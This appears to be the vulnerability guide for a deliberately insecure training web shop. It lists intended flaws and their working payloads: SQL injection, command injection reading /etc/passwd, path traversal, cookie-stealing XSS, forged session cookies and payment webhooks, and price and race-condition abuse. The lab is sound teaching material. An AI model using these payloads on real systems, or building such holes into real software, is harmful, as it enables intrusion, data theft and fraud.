# VULNERABILITIES.md

Documented, **intended** security flaws in the Monkstore lab. This file lists the
vulnerabilities you are meant to know about. Additional **hidden** challenges exist
and are documented separately in `SOLUTIONS.md` (a sealed answer key).

**Never expose this application to a public network.**

Architecture note: the backend is now TypeScript/Fastify with Prisma. The classic
lab endpoints live in an isolated module `apps/backend/src/lab/index.ts`. The
shop/currency vulnerabilities live in the feature routes and are marked `[VULN]`.

Base URL in local Docker: `http://localhost:8081` (proxy) or `http://localhost:3000` (API direct).

---

## Classic web vulnerabilities

### 1. SQL Injection — `GET /api/search?q=`
`apps/backend/src/lab/index.ts`. The `q` param is concatenated into a raw query run
via Prisma `$queryRawUnsafe`.
```
# Dump everything
/api/search?q=' OR '1'='1
# UNION extraction (id is uuid → cast to text; 4 columns: id,name,rarity,price)
/api/search?q=' UNION SELECT id::text, username, email, 0 FROM users-- 
```
On error the response also echoes the full SQL (verbose-error leak).

### 2. Command Injection — `GET /api/ping?host=`
`host` is concatenated into a shell command (`ping -c 2 <host>`) run via `exec`.
```
/api/ping?host=127.0.0.1;id
/api/ping?host=127.0.0.1;cat /etc/passwd
```
Note: under rootless Docker the baseline `ping` may lack raw-socket permission, but
the **injected** command (after `;`) still executes.

### 3. IDOR — `GET /api/user?id=`
No auth. Returns the full row **including the password hash** for any user id.
Also SQL-injectable (`id::text = '<id>'`).
```
/api/user?id=<any-uuid>
```

### 4. Broken Access Control — `GET /api/admin/users`
The only check is the header `X-Admin: true`.
```
curl http://localhost:3000/api/admin/users -H "X-Admin: true"
```
`admin.html` sends the header automatically and has no frontend guard.

### 5. Local File Inclusion / Path Traversal — `GET /api/file?name=`
`name` is `path.join`-ed onto `/app`. Use traversal (absolute override does **not**
work through `path.join`).
```
/api/file?name=../../etc/passwd
/api/file?name=package.json
```
On error the attempted path is echoed back.

### 6. Unrestricted File Upload — `POST /api/upload` + `GET /api/uploads/:file`
No MIME/extension checks. Filename comes from the `X-Filename` header. Files are
served back verbatim.
```
curl -X POST http://localhost:3000/api/upload -H "X-Filename: pwn.txt" --data-binary 'anything'
curl http://localhost:3000/api/uploads/pwn.txt
```

### 7. Reflected XSS — shop search
`apps/frontend/src/shop.ts` renders the search term via `innerHTML` when a search
returns no results. In the shop search box:
```
<img src=x onerror=alert(document.cookie)>
```

### 8. Stored XSS — reviews
`POST /api/reviews` stores content verbatim; `apps/frontend/src/nft.ts` renders
author/content via `innerHTML`.
```
POST /api/reviews {"nftId":"monk-001","author":"x","content":"<img src=x onerror=alert(1)>"}
# View: /nft.html?id=monk-001
```

### 9. Sensitive Data Exposure — `GET /api/debug`
Returns `JWT_SECRET`, `DATABASE_URL`, DB credentials, node version. (Stripe keys are
deliberately excluded.) With `JWT_SECRET` you can forge tokens for any user id.

### 10. Insecure Deserialization — `GET /api/session`
Sets/reads a base64 JSON `session` cookie with no signature. Forge `isAdmin:true`:
```
curl http://localhost:3000/api/session -H "Cookie: session=$(echo -n '{"userId":"x","isAdmin":true}' | base64)"
```

### 11. Security Misconfiguration — verbose errors
`/api/search` echoes the SQL; `/api/file` echoes the path; `/api/debug` exposes
secrets; DB errors are returned in responses.

---

## Shop / currency vulnerabilities (in-app tokens)

Money is an in-app currency ("Monk Tokens"). New users start with 1000 tokens.

### A. Price Manipulation — `POST /api/purchase`
The endpoint trusts a client-supplied `price`. Buy a Mythic for nothing:
```
POST /api/purchase {"nftId":"monk-001","price":0}
```

### B. Race Condition (TOCTOU) — `POST /api/purchase`
Balance is checked, then debited across a non-atomic gap. Fire concurrent requests
to overspend (double-spend). Example: 10 parallel buys of a 1000-token item on a
1000 balance drives the wallet negative and grants all 10.

### C. Deposit Webhook Without Signature Verification — `POST /api/deposit/webhook`
The webhook never verifies a Stripe signature. Forge a completed payment to mint
tokens for any user:
```
POST /api/deposit/webhook
{"type":"checkout.session.completed","data":{"object":{"metadata":{"userId":"<uuid>","tokens":"99999"}}}}
```

### D. Amount & Wallet Manipulation
- **Negative amounts:** `POST /api/purchase {"nftId":"monk-002","price":-5000}` credits the wallet. Same for negative `tokens` on deposit.
- **Mass assignment:** `POST /api/register {"username":...,"email":...,"password":...,"isAdmin":true,"balance":1000000}` sets admin/balance from the body.
- **Wallet IDOR:** `GET /api/wallet?userId=<other-uuid>` reads any user's balance.

---

## Quick reference

| # | Vulnerability | Location |
|---|---|---|
| 1 | SQL Injection | `GET /api/search?q=` |
| 2 | Command Injection | `GET /api/ping?host=` |
| 3 | IDOR (password hash) | `GET /api/user?id=` |
| 4 | Broken Access Control | `GET /api/admin/users` + `X-Admin: true` |
| 5 | LFI / Path Traversal | `GET /api/file?name=` |
| 6 | Unrestricted Upload | `POST /api/upload` + `GET /api/uploads/:file` |
| 7 | Reflected XSS | shop search box |
| 8 | Stored XSS | `POST /api/reviews` → `/nft.html?id=` |
| 9 | Sensitive Data Exposure | `GET /api/debug` |
| 10 | Insecure Deserialization | `GET /api/session` cookie |
| 11 | Verbose Errors | error responses |
| A | Price Manipulation | `POST /api/purchase` (`price`) |
| B | Race Condition (TOCTOU) | `POST /api/purchase` (concurrent) |
| C | Webhook w/o Signature | `POST /api/deposit/webhook` |
| D | Amount/Wallet Manipulation | negative amounts · mass assignment · `GET /api/wallet?userId=` |
